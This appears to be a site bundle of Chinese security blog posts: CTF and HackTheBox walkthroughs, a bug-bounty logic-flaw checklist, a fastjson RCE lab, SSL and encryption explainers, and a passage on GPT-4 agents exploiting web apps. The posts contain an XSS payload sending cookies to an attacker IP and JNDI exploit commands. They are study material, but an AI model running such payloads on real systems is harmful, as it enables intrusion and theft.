3. 最后，调用了 CSRF 代理。但是，它的任务是针对 上提供的各种菜单和操作。 - 运行 1：代理成功登录并导航到菜单创建端点。在那里，它采取了一些步骤来自行创建一个菜单。然后，它验证是否已创建新菜单，并构建了一个 CSRF 有效负载，该有效负载利用 CVE-2024–24524 重新创建这些步骤。 - 运行 2：座席成功登录并导航到帖子创建页面。然后，它创建了一个帖子并制作了一个 CSRF 有效负载，如果点击该有效负载，它应该使管理员创建一个帖子，但它不起作用。 - 运行 3：代理登录并导航到帖子创建页面，再次尝试制作有效负载以创建新帖子。但是，有效载荷再次不起作用。\`/admin.php\`

从这些案例研究中，我们可以观察到HPTSA的几个特征。首先，它可以成功地在特定任务代理的执行跟踪中合成信息。例如，从第一次到第二次 XSS 运行，它都专注于特定页面。此外，根据 SQL 跟踪，它确定 CSRF 代理应专注于 /admin.php 端点。这种行为与专家网络安全红队员的行为没有什么不同。

我们还注意到，特定于任务的代理现在可以专门关注漏洞，而无需回溯，因为回溯属于主管代理的职权范围。这解决了我们之前的代理中的一个问题，即单个代理在回溯过程中会变得混乱。

# 结论

正如我们在过去几个月中所展示的那样，人工智能代理具有很强的能力来执行网络安全黑客攻击。重要的是，我们的进步不需要新的模型：我们在过去两项研究中测试了相同的基础模型。唯一的变化是我们如何使用 GPT-4！

如前所述，我们的结果表明，在聊天机器人设置中测试 LLM，就像[最初的 GPT-4 安全评估](https://cdn.openai.com/papers/gpt-4-system-card.pdf)一样，不足以理解 LLM 的能力。我们希望未来的工作重点放在前沿车型的全面安全评估上。`,ie=`---
title: 业务逻辑漏洞的挖掘
tags: [WebSec,BugBounty]
categories: [BugBounty]
---





1 、身份认证安全
1.1、暴力破解
在没有验证码限制或者一次验证码可以多次使用的地方，使用已知用户对密码进行暴力破解或者用一个通用密码对用户进行暴力破解。简单的验证码爆破。

1.2、session & cookie类
会话固定攻击:利用服务器的session不变机制，借他人之手获得认证和授权，冒充他人。

Cookie仿冒:修改cookie中的某个参数可以登录其他用户。

1.3、弱加密
未使用https，是功能测试点，不好利用。

前端加密，用密文去后台校验，并利用smart decode可解

2、业务一致性安全
2.1、手机号篡改
抓包修改手机号码参数为其他号码尝试，例如在办理查询页面，输入自己的号码然后抓包，修改手机号码参数为其他人号码，查看是否能查询其他人的业务。

2.2、邮箱或者用户篡改
抓包修改用户或者邮箱参数为其他用户或者邮箱

2.3、订单id篡改
查看自己的订单id，然后修改id(加减一)查看是否能查看其他订单信息。

2.4、商品编号篡改
例如积分兑换处，100个积分只能换商品编号为001,1000个积分只能换商品编号005,在100积分换商品的时候抓包把换商品的编号修改为005，用低积分换取高积分商品

2.5、用户id篡改
抓包查看自己的用户id，然后修改id(加减1)查看是否能查看其他用户id信息。

3、业务数据篡改
3.1、金额数据篡改
抓包修改金额等字段，例如在支付页面抓取请求中商品的金额字段，修改成任意数据的金额并提交，查看能否以修改后的金额数据完成业务流程。

3.2、商品数量篡改
抓包修改商品数量等子段，将请求中的商品数量修改成任意数额，如负数并提交，查看能否以修改后的数量完成业务流程。

3.3、最大数限制突破
很多商品限制用户购买数量时，服务器仅在页面通过js脚本限制，未在服务器端校验用户提交的数量，通过抓包修改商品最大数限制，将请求中的商品数量改为大于最大数限制的值，查看能否以修改后的数量完成业务流程。

3.4、本地js参数修改
部分应用程序通过Javascript处理用户提交的请求，通过修改Javascript脚本，测试修改后的数据是否影响到用户。

4、密码找回漏洞
密码找回逻辑测试一般流程

i.首先尝试正常密码找回流程，选择不同找回方式，记录所有数据包

ii.分析数据包，找到敏感部分

iii.分析后台找回机制所采用的验证手段

iv.修改数据包验证推测



5、验证码突破
验证码不单单在登录、找密码应用，提交敏感数据的地方也有类似应用，故单独分类，并进一步详情说明。

5.1、验证码暴力破解测试
使用burp对特定的验证码进行暴力破解

5.2、验证码时间、次数测试
抓取携带验证码的数据包不断重复提交，例如:在投诉建议处输入要投诉的内容信息，及验证码参数，此时抓包重复提交数据包，查看历史投诉中是否存在重复提交的参数信息。

5.3、验证码客户端回显测试
当客户端有需要和服务器进行交互，发送验证码时，即可使用firefox按F12调出firebuf就可看到客户端与服务器进行交互的详细信息

5.4、验证码绕过测试
当第一步向第二步跳转时，抓取数包，对验证码进行篡改清空测试，验证该步骤验证码是否可以绕过。

5.5、验证码js绕过
短信验证码验证程序逻辑存在缺陷，业务流程的第一步、第二步，第三步都是放在同一个页面里，验证第一步验证码是通过js来判断的，可以修改验证码在没有获取验证码的情况下可以填写实名信息，并且提交成功。

6、业务授权安全
6.1、未授权访问
非授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面或文本信息。可以尝试在登录某网站前台或后台之后，将相关的页面链接复制于其他浏览器或其他电脑上进行访问，看是否能访问成功。

6.2、越权访问
水平越权

即用户A和用户B属于同一个权限组，水平越权就是用户A可以看到用户B才可以看到的一些内容。一个简单的例子，就是保单管理系统中，每个人都只可以看到自己的保单，如果出现用户A可以查看到用户B的保单的现象，此时就发生了水平越权。

垂直越权

即用户A和用户B属于不同的权限组，如用户A属于普通用户权限组，而用户B属于管理员权限组，垂直越权就是用户A可以看到用户B才可以看到的内容。一个简单的例子，用户A可以看到通讯录界面，用户B可以看到通讯录和用户管理的界面（其中用户管理界面可以看到用户密码）。如果用户A修改一下请求的URL即可以看到作为管理员才可已看到的全部用户密码，此时就发生了垂直越权。

检测思路

出现越权访问漏洞的主要原因，是因为开发人员只是在前端界面进行了简单的菜单隐藏，而没有用统一的服务端拦截器/中间件对于全部URL请求进行权限判断。这样，攻击者只需要在浏览器或者BurpSuite之类的攻击工具中，发出对于指定URL的请求，即可以实现对于特定接口的越权访问。

如果将用户A与他所属的权限组/不同权限组用户群体的惯常访问URL合集进行比对，可以发现有些URL是多个用户都会访问的，而有的URL（或者请求中含有的特定的参数）是各个用户访问时都存在差异的。这类具有差异性的URL即为敏感URL。

当用户A访问了不在惯常访问URL合集内的URL，且此URL为敏感URL，即可以判定为发生了越权访问。

7、业务流程乱序
7.1、顺序执行缺陷
a) 部分网站逻辑可能是先A过程后B过程然后C过程最后D过程

b) 用户控制着他们给应用程序发送的每一个请求，因此能够按照任何顺序进行访问。于是，用户就从B直接进入了D过程，就绕过了C。如果C是支付过程，那么用户就绕过了支付过程而买到了一件商品。如果C是验证过程，就会绕过验证直接进入网站程序了。

8、业务接口调用安全
8.1、重放攻击
在短信、邮件调用业务或生成业务数据环节中(类:短信验证码，邮件验证码，订单生成，评论提交等),对其业务环节进行调用(重放)测试。如果业务经过调用(重放)后被多次生成有效的业务或数据结果。

a) 恶意注册

b) 短信

在测试的过程中，我们发现众多的金融交易平台仅在前端通过JS校验时间来控制短信发送按钮，但后台并未对发送做任何限制，导致可通过重放包的方式大量发送恶意短信

8.2、内容编辑
点击"获取短信验证码",并抓取数据包内容。通过分析数据包，可以发现参数sendData/insrotext的内容有客户端控制，可以修改为攻击者想要发送的内容

9、时效绕过测试
大多有利用的案例发生在验证码以及业务数据的时效范围上，在之前的总结也有人将12306的作为典型，故，单独分类。

9.1、时间刷新缺陷
12306网站的买票业务是每隔5s，票会刷新一次。但是这个时间确实在本地设置的间隔。于是，在控制台就可以将这个时间的关联变量重新设置成1s或者更小，这样刷新的时间就会大幅度缩短(主要更改autoSearchTime本地参数)。

9.2、时间范围测试
针对某些带有时间限制的业务，修改其时间限制范围，例如在某项时间限制范围内查询的业务，修改含有时间明文字段的请求并提交，查看能否绕过时间限制完成业务流程。例如通过更改查询手机网厅的受理记录的month范围，可以突破默认只能查询六个月的记录。

新设置成1s或者更小，这样刷新的时间就会大幅度缩短(主要更改autoSearchTime本地参数)。

9.2、时间范围测试
针对某些带有时间限制的业务，修改其时间限制范围，例如在某项时间限制范围内查询的业务，修改含有时间明文字段的请求并提交，查看能否绕过时间限制完成业务流程。例如通过更改查询手机网厅的受理记录的month范围，可以突破默认只能查询六个月的记录。
### SRC中的逻辑漏洞总结

1. 注册：
    1. 短信轰炸
    2. 验证码安全问题
    3. 密码爆破
    4. 邮箱轰炸
2. 用户任意注册、批量注册
3. 用户名枚举
4. XSS（有框的地方就可以尝试插XSS）
5. 登录：
    1. 短信轰炸、验证码安全问题、密码爆破、邮箱轰炸
    2. SQL注入
    3. 撞库
    4. 抓包把password字段修改为空值发送
    5. 认证凭证替换、比如返回的数据包中包含账号，修改账号就能登录到其他账号
    6. Cookie仿冒
    7. 修改返回包的相关数据，可能会登陆到其他的用户
6. 找回密码：
    1. 短信邮箱轰炸、短信邮箱劫持
    2. 重置任意用户账户密码、验证码手机用户未统一验证
    3. 直接跳过验证步骤
7. 购买支付、充值（要利用抓包去仔细查看每一个可用的参数）
    1. 交易金额、数量修改、更换支付模块（比如更换支付的模块金额）
    2. 交易信息订单编码/导致信息泄露
    3. 整数溢出，int最大值为2147483647，超过最大值
    4. 修改充值账户
    5. 支付绕过
8. 抽奖活动
    1. 刷奖品、积分
    2. 并发
9. 优惠卷、代金卷
    1. 并发逻辑漏洞（burp批量获取优惠券）
    2. 修改优惠券金额、数量
10. 订单信息
    1. 订单信息遍历、泄露
    2. 订单信息泄露导致用户信息泄露
    3. 删出他人订单
11. 会员系统
    1. 修改个人信息上传文件，上传带弹窗的html
    2. 如遇上上传xlsx、docx，可能存在XXE，上传恶意的文档盲测
    3. 图片上传也可能遇到imagereagick命令执行，上传恶意图片
    4. 视频上传如果使用ffmpeg<3.2.4（视频按帧分割成图片），上传恶意avi盲测ssrf
    5. 用户横向越权访问、遍历、导致用户信息泄露
    6. SQL注入、个人简历处存储XSS个人信息注册的名称也可以插入XSS

1. 传输过程
    1. 明文传输账户密码
    2. 修改信息处无session/token导致csrf
    3. POST/COOKIE注入

1. 评论
    1. POST注入
    2. 存储型XSS
    3. 无session/token导致CSRF

  

1. 验证码问题
    1. 万能验证码
    2. 返回包中存在验证码
    3. 删除验证码或者cookie中的值可以爆破账号密码
2. 短信轰炸
    1. 一直重放
    2. 删除修改cookie，重放数据包
    3. 遍历参数发送数据包
    4. 手机号后面加空格或者前面加其他的比如+86或者逗号分号等，然后重发数据包
    5. 请求参数修改大小写，或者添加请求参数比如&id=1
    6. 一个站的登录处可能做了防护，但是再找回密码处可能没有安全防护，或者在注册流程中没有安全防护，所以说多测试接口
    7. 如果对手机号一天的次数进行了限制，还可以再发一次短信，DO intercept之后修改为成功回显

1. 水平越权
    1. 主要登陆后还是修改参数，主要找到多个接口不断测试
    2. 关注网页源代码，有时候会有表单，但被bidden（隐藏标签）给隐藏起来了，可以修改返回包然后尝试获取数据检测
    3. 多个账号，主要分析请求参数
2. 数据泄露
    1. 再找回密码处，填写数据后抓包查看返回信息，有可能存在敏感数据返回
3. 任意用户密码重置
    1. 目前大部分都是在修改密码处参数修改
    2. 有些是前端验证

支付逻辑漏洞

1. 边界值问题 : 正常的逻辑是用户购买商品，然后价格累加得到一个总价进行扣款。这个时候就会产生逻辑问题：如果说用户购买的商品是负数了，那么计算的总数就是负数。反过来钱给用户
2. 顺序执行缺陷：正常的逻辑是a-b-c-d 循环渐进的进行流程操作。这个时候就会产生逻辑问题：可以直接从中绕过某一个过程进入到下一步操作。如果说有一项是支付的操作，那么也就会产生支付绕过，如果说有一项是验证机制，就会绕过验证直接进入下一步。
3. 金额直接传输导致篡改：直接对下单的金额进行修改值，这里可以使用fd或者burp抓包
4. 确定支付之后还可以加入购物车：把商品放入购物车点击下单支付，会跳转到微信，支付宝等第三方支付平台。这个时候还可以继续在购物车中加入商品，支付结束之后，商家发放的商品是现在的购物车里面的东西。
5. 请求重放：购买成功之后，继续重放请求，可以让购买的商品一直增加。购买成功之后，会有一个银行对商户网站跳转的过程，如果反复进行操作，有几率会导致商品反复购买和增加，但是不需要付更多的钱。
6. 请求参数干扰：金钱做了签名认证之后，修改后不通过，但是在里面仍然会有一个参数对金额产生影响导致问题产生。
7. 订单替换：订单替换发生在支付之后的事件处理，同时向服务器发起二次支付请求一个多一个少，支付金额少的，然后支付之后进行替换，告知服务器订单支付完成，并且过程可以反复的回放。
8. 欺诈:需要两个收款人，一个是正常的商家，一个是伪造的商家
9. 单位替换：产生在paypal类似的国际支付的场景。
10. 用户替换：在支付过程中发生用户替换现象，首先登陆自己的账户，然后取得另外一个人的账户名等有效信息，在业务流程中用对方的用户名替换自己的用户名，用对方的余额购买完成后，再替换自己的账户名，这样就形成别人的钱买自己的东西
11. 强制攻击：强制攻击发生在暴力破解的情况下，如果一个商家运用一个自己的网店，接入第三方支付接口，由于设计上的不当导致商家与第三方支付约定的密钥Key可以单独被MD5加密，导致可以使用MD5碰撞技术对密钥进行破解，攻击者可以设计简单的密钥加密信息使得MD5加密是可以用MD5碰撞技术进行暴力破解。
12. 秘钥泄漏：内置支付功能的app为了设计上的方便有可能会把Md5或者是RSA的私钥泄漏导致攻击者反编译apk之后获取密钥信息使得交易信息可以被篡改。
13. 函数修改：apk反编译之后的函数修改，可能导致商家在最后一步向支付方提交订单时未验证信息的准确性，仍然被篡改。
14. heart bleed：SSL（安全套接层）协议是使用最为普遍网站加密技术，而OpenSSL则是开源的 SSL 套件，为全球成千上万的web服务器所使用。Web服务器正是通过它来将密钥发送给访客然后在双方的连接之间对信息进行加密。URL中使用 https打头的连接都采用了SSL加密技术。在线购物、网银等活动均采用SSL技术来防止窃密及避免中间人攻击。

该漏洞被归为缓冲过度读取。缓冲过度读取错误是软件可以读取比应该被允许还多的数据。漏洞让特定版本的openSSL成为无需钥匙即可开启的“废锁”，入侵者每次可以翻检户主的64K信息，只要有足够的耐心和时间，就可以翻检足够多的数据，拼凑出户主的银行密码、私信等敏感数据。产生原因：数据在传输的两端是不加密的。一些数据如果在传输过程中不加密则会泄露个人数据等信息。

1. 修改返回包的越权
    1. 修改手机号

一般的逻辑为：认证原手机号-> 填写新手机号-> 提交修改

如果在下一步操作时，没有校验上一步的认证是否成功时，就会存在逻辑缺陷绕过

比如在进行第一步认证原手机号时，随意输入验证码，将response包中的相关字段进行修改，比如0改成1，false改成true，即可绕过第一步验证，进入填写新手机号界面，如果第三步提交修改时没有验证第一步的结果，就会造成逻辑漏洞

1. 登录绕过

部分网站的身份验证放在了前端，因此只需要将response包中的相关字段进行修改，比如0改成1，false改成true，就可以登录任意用户账号

1. 水平越权
    1. 遍历ID

在一些请求中，GET和POST中有明显的ID数字参数（手机号、员工号、账单号、银行卡号、订单号等等），可以尝试进行遍历，如果程序没有对当前权限进行判断，就会存在水平越权问题

1. ID替换

如果程序对用户标识进行了hash或者加密，而无法破解用的什么方式的话，就无法通过遍历ID来获取其它用户的信息了，此时可以尝试注册两个账号，通过替换两个ID加密后的值，判断程序是否对权限进行了验证，如果没有，也会存在越权问题

1. 垂直越权

观察cookie中的session字段，可能某些字段或者参数代表身份，尝试修改`,re=`---
title: 文件包含 # 文章名称
tags: [CTF,WebSec]
categories: [CTF]
---

CTF文件包含

===


\`\`\`php
<?php
//WEB手要懂得搜索

if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match("/php|flag|data|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\-|\\_|\\+|\\=/i", $file)){
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
} 
\`\`\`
## 获取nginx log文件

![alt text](../assets/img/image.png)

## 写入一句话木马

中间件的日志文件会保存网站的访问记录,比如HTTP请求行,User-Agent,Referer等客户端信息，如果在HTTP请求中插入恶意代码,那么恶意代码就会保存到日志文件中,访问日志文件的时候，日志文件中的恶意代码就会执行,从而造成任意代码执行甚至获取shell。


`,ce=`---
title: 什么是SSL证书
tags: [SSL,WebSec]
categories: [NetSec]
---

## SSL证书的工作原理

SSL（安全套接字层）以及此协议的升级版本，称为TLS（传输层安全性），是一种构建[加密](https://us.norton.com/blog/privacy/what-is-encryption)Web 浏览器和服务器之间的连接。

您可以将用户和网站视为峡谷两侧的两座建筑物。为了让用户访问网站，反之亦然，需要有一个桥梁。SSL证书就是那座桥梁——它是安全的，并允许信息安全地从一侧传输到另一侧。

在访问具有SSL证书的网站的几毫秒内，会发生许多重要的过程：

- 您的浏览器会向网站的服务器发送请求，要求提供安全页面。
- 服务器将SSL证书与公钥一起传输。公钥对数据进行加密并验证数字签名。
- 您的浏览器会验证数字签名的合法性，并在地址栏中显示挂锁图标。
- 然后，您的浏览器会使用密钥将加密数据传输到站点的服务器。
- 使用私有解密密钥，服务器读取数据并访问密钥。
- 只要连接就位，浏览器和服务器就会使用秘密解密密钥来回共享安全数据。

如果您在线并访问没有 SSL 加密的网站，您可能会被警告”[您的连接不是私有的](https://us.norton.com/blog/how-to/your-connection-is-not-private).”这意味着网络犯罪分子可以拦截您在该网站上分享的任何内容。

![Illustrated chart covering how SSL certificates work.](https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-01.png)

## SSL 的类型

SSL 有三种主要类型：扩展验证、组织验证和域验证。其中有一些变体作为亚型存在，它们包括通配符、MD/SAN 和 UCC。

主要区别在于需要哪些信息来保护每种类型。扩展验证证书需要的信息最多，而域验证证书需要的信息最少。

这通常意味着信息量更大的证书更值得信赖，因为获得证书所需的信息深度。

在这三种主要类型中，有更专业的版本，通常是为企业或其他大型组织设计的。

每个 SSL 证书都包含以下信息：

- 域名
- 拥有证书的公司、个人或设备
- 子域名
- 证书颁发机构 （CA）
- CA 的数字签名
- 发行日期
- 有效期
- 公钥（私钥是保密的）

### 扩展验证证书 （EV SSL）

**EV SSL是所有SSL证书中经过最广泛审查和检查的证书。**对于要获得 EV SSL 的网站，它必须完成一个 16 步过程，验证有关网站所有权的详细信息。其中一些详细信息包括确认：

- 域
- 网站所有者
- 申请人的实际住址
- 开展业务的合法权利

这些SSL通常由大型公司和任何需要向公众展示最高可信度的机构使用，包括银行和支付处理器。当您访问其中一个网站时，EV SSL 表明域名所有者已采取重大措施[保护数据隐私的步骤](https://us.norton.com/blog/how-to/ten-ways-to-keep-your-data-private).

![Illustrated chart covering what an Extended Validation Certificate (EV SSL) is.](https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-02.png)

### 组织验证证书 （OV SSL）

获得 OV SSL 比申请 EV SSL 更容易。**对于颁发 OV SSL 的证书颁发机构，他们仅对实体执行基本审查。**他们检查组织或企业是否存在，以及申请证书的实体是否拥有域名。

OV SSL 的最常见用途是用于需要安全性但不面向公众的站点。例如，OV SSL 非常适合需要为内部系统提供安全登录页面或作为 Intranet 安全性的公司。

![Illustrated chart covering what an Organization Validated Certificate (OV SSL) is.](https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-03.png)

### 域验证证书 （DV SSL）

DV SSL是最基本的SSL证书类型。**证书颁发机构仅确认域由请求证书的个人或实体控制。** DV SSL 可以快速发布，但它提供与 EV 和 OV SSL 相同的加密级别。[网络安全](https://us.norton.com/blog/malware/what-is-cybersecurity-what-you-need-to-know)立场。因为它们相对容易获得并且可以提供安全的错觉，所以有时会在不安全的网站上找到 DV SSL。

这些 SSL 适用于小型企业网站、个人网站和博客，因为它们可以加密流量并允许人们在无需提供身份验证的情况下安全访问。

![Illustrated chart covering what a Domain Validation Certificate (DV SSL) is.](https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-04.png)

### 通配符SSL证书

**通配符 SSL 涵盖网站上的子域，而无需为每个子域提供单独的 SSL 证书。** 证书使用一个字符（通常是星号）作为多个其他字符（通常是其他页面或子域的名称）的替换。通配符在 DV 和 OV SSL 中都可用。

通配符证书对于在同一服务器上具有多个子域的实体非常有用。它们比为每个子域购买证书更实惠，并且它们允许您随着时间的推移添加和删除子域。

![Illustrated chart covering what a wildcard SSL is.](https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-05.png)

### 多域和主题备用名称 SSL 证书 （MD/SAN）

**MD 或 SAN SSL 证书使用单个证书认证多个域和子域。** 这些证书中的大多数可以同时用于多达 250 个不同的域。这些证书以 EV、OV 和 DV SSL 的形式提供。

对于拥有许多不同域的公司或组织，MD 或 SAN SSL 是保护所有这些域的最快、最简单的方法。

![Illustrated chart covering what a Multi-Domain Validation Certificate (MDC SSL) is.](https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-06.png)

#### **统一通信证书 （UCC）**

**UCC 是一种 SAN 证书，它允许在一个证书下保护三个或更多服务器上的多个域和子域。** UCC 还具有专门用于保护 Microsoft Exchange、Live 和通信服务器类型的附加功能。它们以 EV、OV 或 DV SSL 的形式提供。

对于在多个服务器上具有多个域和子域的大型组织，以及具有 Microsoft Exchange 服务器的组织，UCC 可以更轻松地管理 SSL 证书。

![Illustrated chart covering what a Unified Communication Certificate (UCC) is.](https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-07.png)
## 为什么网站需要SSL证书

网络攻击是一种令人惊讶的常见威胁。[**网络安全统计**](https://us.norton.com/blog/emerging-threats/cybersecurity-statistics) **表明超过一半的互联网用户在过去一年中直接经历过网络犯罪。这意味着人们比以往任何时候都更需要保护自己的数据，并且[了解他们访问的网站是否安全](https://us.norton.com/blog/how-to/how-to-know-if-a-website-is-safe).

SSL证书是更安全浏览墙中的一块重要砖块，因为它让您知道您在网站上共享的信息受到加密保护。如果没有加密，从用户传输到站点的数据就不会受到保护，从而使您面临[中间人攻击](https://us.norton.com/blog/wifi/what-is-a-man-in-the-middle-attack)以及其他类型的网络攻击。

如果您是企业主或负责组织的网站，SSL 可以为您的客户和其他网站用户提供额外的保护层，让您高枕无忧。虽然这些SSL安全证书之一不足以阻止或阻止所有形式的[黑客](https://us.norton.com/blog/emerging-threats/what-is-a-hacker)或者信息盗窃本身，这是一个重要的步骤，可以帮助保护组织的数据和公众认知。

![Illustrated chart explaining a few of the main reasons why websites should have SSL certificates.](https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-08.png)

## 如何获取SSL证书

如果您拥有一个网站，您可能想知道如何利用SSL证书附带的额外信任。继续阅读以了解如何为您的网站获取一个。

### 1. 确认您需要的信息

每个证书颁发机构都有不同的要求，您需要先满足这些要求，然后才能发出 SSL。考虑到这一点，无论您是申请 EV、OV 还是 DV SSL，**每个 CA 都会要求您提供一些标准信息**，包括：

- 证明您拥有该域名
- 证明您是申请SSL的人

随着验证级别的提高，您需要提供更多信息。

### 2. 选择从何处获取 SSL 证书

**全球有数十个不同的证书颁发机构验证和提供网站 SSL。** 在搜索 CA 时，请考虑查找符合以下条件的 CA：

- 提供您需要的 SSL 类型
- 满足颁发证书所需的所有最低标准
- 具有清晰的定价结构
- 为您提供所需的客户支持

### 3.考虑SSL的成本

虽然大多数SSL证书要求您向证书颁发机构付费，但也有免费选项。通常，免费的SSL仅限于域验证证书，这意味着对于具有多个域和子域的大型实体或组织来说，它们并不理想（甚至可能可用）。

- **如果您有个人网站或小型企业的简单网站**，那么免费的SSL证书可能会为您提供所需的一切。
- **适用于处理敏感问题的大型企业或组织**[**个人信息**](https://us.norton.com/blog/privacy/what-personal-information-should-you-safeguard) **与财务或医疗数据一样**，与可以跨一个或多个服务器颁发涵盖多个域或子域的证书的 CA 通常是一个好主意。

### 4.掌握SSL证书续订情况

对于小企业主或博主来说，如果您的SSL证书过期并且您忘记续订几天，这可能不是一个大问题。

但是，如果您是一个每天处理大量外部或内部流量的大品牌，那么失效的证书可能会花费您很多钱并损害您的声誉。

### 什么是证书颁发机构？

证书颁发机构 （CA） 是颁发 SSL 证书的组织。CA 的工作是使用证书验证站点所有者的身份，然后存储和签署这些证书。他们必须满足严格的准则，以便设备、操作系统和浏览器信任他们的证书。

### 什么是公钥/私钥对？

公钥和私钥使授权用户能够发送和接收加密数据。

公钥由证书生成，任何使用站点的人都可以使用。私钥是秘密的，在建立连接后由用户的浏览器创建。由于加密数据是在证书所有者和用户之间发送的，因此除了公钥的颁发者和私钥的持有者之外，任何人都无法读取数据。

### SSL证书的有效期是多久？

大多数SSL证书的有效期为一年，但有些CA提供更长的覆盖期限，例如两到三年。

### 什么是安全证书？

安全证书（包括 SSL 或 TLS 证书）是一个小型数据文件，用于向用户证明站点的真实性以及[创建安全连接](https://us.norton.com/blog/privacy/ssl-vpn)使用加密。

### SSL证书可以在多台服务器上使用吗？

是的，使用多域证书，您可以在多个服务器上使用一个 SSL。

### HTTPS 是如何工作的？

![alt text](<../assets/img/Pasted image 20240131171202.png>)`,le=`[https://vulhub.org/#/environments/fastjson/1.2.24-rce/](https://vulhub.org/#/environments/fastjson/1.2.24-rce/)

## 玩玩这个漏洞

![alt text](../assets/img/image-52.png)


## 借助项目

 https://github.com/mbechler/marshalsec.git

![alt text](../assets/img/image-53.png)

### 获取Jar
![alt text](../assets/img/image-54.png)


### 编译成功

![alt text](../assets/img/image-55.png)


### Demo.class
![alt text](../assets/img/image-57.png)

\`\`\`java
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class Demo {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/success"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
\`\`\`


### 运行rmi程序

\`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.31.241:1234/#Demo" 9999\`

![alt text](../assets/img/image-56.png)

![alt text](../assets/img/image-59.png)

![alt text](../assets/img/image-58.png)

### 一定要注意版本问题
java 版本和 javac 版本一定要一致，不然会出现问题

![alt text](../assets/img/image-60.png)

应该使用第二个javac`,Ae=`---
title: hackthebox-IClean-walkthrough
tags:
  - NetSec
  - Linux
categories:
  - hackthebox
password: lidefei
---

IClean 获取flag
===

## 机器环境
### 目标机器 

IP : 10.10.11.12

![alt text](../assets/img/image-62.png)


> 由于我想要使用windows中的浏览器和burpusuite进行攻击, 但是同时想要使用kali中的工具进行攻击，如何实现呢？
> ![alt text](../assets/img/image-64.png)

### 宿主机器

IP : 

![alt text](../assets/img/image-63.png)


## 渗透思路

1. 给的是IP地址，直接扫描端口
    ![alt text](../assets/img/image-65.png)
    被扫坏了 重新启动

2. 看到80端口，直接访问
    ![alt text](../assets/img/image-66.png)
    登录API
    http://capiclean.htb/login
    http://capiclean.htb/quote

    ![alt text](../assets/img/image-69.png)
    

### XSS
 
  web界面
  ![alt text](../assets/img/image-70.png)


    \`\`\`bash
  <img src=x onerror=fetch("http://192.168.31.241:4321/"+document.cookie);>
    \`\`\`

### cao, 遮掉网络不稳啊

玩玩ctf吧， 好像白天稳啊`,pe=`---
title: easy的代码审计 
tags: [Netsec,代码审计]
categories: [CTF]
---

代码审计
======

![alt text](../assets/img/image-71.png)
`,de=`---
title: V&N2020-公开赛CHECKIN 
tags: [RCE,Linux]
categories: [CTF]
---

====


# 直接代码审计

\`\`\`python
from flask import Flask, request
import os

app = Flask(__name__)

flag_file = open("flag.txt", "r")
# flag = flag_file.read()
# flag_file.close()

# @app.route('/flag')
# def flag():
#     return flag
#     ## want flag? naive!
#     # You will never find the thing you want:)

@app.route('/shell')
def shell():
    os.system("rm -f flag.txt")
    exec_cmd = request.args.get('c')
    os.system(exec_cmd)
    return "1"

@app.route('/')
def source():
    return open("app.py", "r").read()

if __name__ == "__main__":
    app.run(host='0.0.0.0')
\`\`\`

## walk through

1. 任意代码执行？
2. 但是flag.txt被删除了
3. 我拿到shell 是不是能hui复原flag.txt呢？

## 由于buuoj不能读取外网

拿到一个linux lab


![alt text](../assets/img/image-72.png)

获取到不到交互式shell

![alt text](../assets/img/image-73.png)`,me=`---
title: 混合加密 
tags: [密码学,对称加密,非对称加密]
categories: [加密算法]
---

# 在信任、性能和安全性方面，混合公钥加密是赢家

我们喜欢公钥加密。它使我们能够安全地交换机密并对数据进行数字签名。但是，在实际加密大量数据时，它并不那么有效。

为此，Bob 将他的公钥发送给 Alice，她用它加密数据并发回密文。然后，Bob 使用关联的私钥对其进行解密。这对于少量数据（例如加密 128 位或 256 位加密密钥）相当有效，但在加密大量数据时，计算成本会变得很高。当我们使用移动设备时，这一点尤其重要，因为计算量的增加通常会耗尽电池电量。我们手头加密数据的核心方法是使用 RSA，但 RSA 通常是在移动设备上实施的重度方法。

那么，解决方案是什么？我们能否将对称密钥加密与公钥加密相结合？
## 对称密钥加密与公钥加密相结合
RFC 9180 提供了一种 HPKE（混合公钥加密）[[此处](https://www.rfc-editor.org/rfc/rfc9180.html)]的解决方案：

![](https://cdn-images-1.readmedium.com/v2/resize:fit:800/0*IzDACVGmBqiHcFCC.png)

这样，我们使用对称密钥来加密数据，然后使用公钥加密来加密对称密钥。我们还可以使用私钥对数据进行签名，并且可以使用关联的公钥进行检查。通过这种方式，我们还可以将身份验证集成到传输的数据中，并且可以正确验证数据的发送者（使用发送者的公钥）。

苹果也刚刚宣布，他们的CryptoKit现在将以Beta形式支持HPKE：

![](https://cdn-images-1.readmedium.com/v2/resize:fit:800/0*ePpotlntVS7-dfzh.png)

除了提供具有附加数据的经过身份验证的加密 （AEAD） 算法外，该库还支持**密钥派生函数** （KDF） 来创建共享密钥：

- HKDF_SHA256.
	- 它使用带有 SHA-256 的基于 HMAC 的密钥派生函数。
- HKDF_SHA384.
	- 这使用基于 HMAC 的密钥派生函数和 SHA-384。
- HKDF_SHA512.
	- 这使用带有 SHA-512 的基于 HMAC 的密钥派生函数。

**密钥封装机制** （KEM） 用于传递共享密钥。为了提高效率，它使用 ECC（椭圆曲线加密）和曲线 25519 或 P256：

- Curve25519_HKDF_SHA256.
	- 这将使用带有 SHA-256 哈希的 X25519。
- P256_HKDF_SHA256.
	- 这使用带有 SHA-256 哈希的 P256 （secp256r1） 曲线。
- P384_HKDF_SHA384 .
	- 这使用带有 SHA-384 哈希的 NIST P384 曲线。
- P521_HKDF_SHA512.
	- 它使用带有 SHA-512 哈希的 NIST P521 曲线，并且具有最强的安全性。

